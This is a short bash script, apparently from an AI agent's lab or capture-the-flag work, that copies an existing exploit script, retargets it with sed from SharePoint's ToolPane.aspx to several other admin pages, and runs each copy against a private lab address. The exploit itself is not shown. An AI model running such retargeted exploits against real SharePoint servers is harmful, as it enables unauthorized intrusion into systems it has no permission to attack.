#!/bin/bash
for endpoint in pagesedit.aspx settings.aspx viewlsts.aspx aclinv.aspx user.aspx people.aspx storman.aspx
do
  echo "=== Testing $endpoint ==="
  cp additional_resources/exploits/exploit.py ai_results/test_$endpoint.py
  sed -i "s|ToolPane.aspx|$endpoint|g" ai_results/test_$endpoint.py
  python3 ai_results/test_$endpoint.py --url http://10.10.10.166 2>&1 | head -3
  echo ""
done
